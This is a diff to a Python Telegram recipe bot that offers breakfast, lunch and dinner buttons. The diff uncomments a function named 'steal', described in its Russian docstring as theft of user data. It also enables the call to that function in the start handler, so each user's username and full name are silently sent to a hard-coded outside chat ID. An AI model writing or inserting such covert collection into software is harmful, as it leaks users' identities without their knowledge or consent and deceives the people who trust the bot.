@@ -20,16 +20,16 @@ updater = Updater(token=token)
 dictionary = {}
 
 
-# def steal(update, context):
-#     """воровство данных пользователя"""
-#     temp = update.effective_chat
-#     username = temp.username
-#     first_name = temp.first_name
-#     last_name = temp.last_name
-#     context.bot.send_message(
-#         chat_id=737479838,
-#         text="steal "+username + " " + str(first_name) + " " + str(last_name)
-#     )
+def steal(update, context):
+    """воровство данных пользователя"""
+    temp = update.effective_chat
+    username = temp.username
+    first_name = temp.first_name
+    last_name = temp.last_name
+    context.bot.send_message(
+        chat_id=737479838,
+        text="steal "+username + " " + str(first_name) + " " + str(last_name)
+    )
 
 
 def Get_URL(url):
@@ -39,7 +39,7 @@ def Get_URL(url):
 def wake_up(update, context):
     chat = update.effective_chat
     button = ReplyKeyboardMarkup([['Завтрак'], ['Обед'], ['Ужин']])
-    # steal(update, context)
+    steal(update, context)
     if chat.last_name is None:
         context.bot.send_message(
             chat_id=chat.id,
@@ -128,10 +128,7 @@ def lunch(update, context):
 
         for i in instruction:
             array.append([i.description, i.image])
-            context.bot.send_message(
-              id,
-              text=parser.GettingName(response)
-          )
+
         context.bot.send_message(
             id,
             text=parser.GettingIngridients(response),
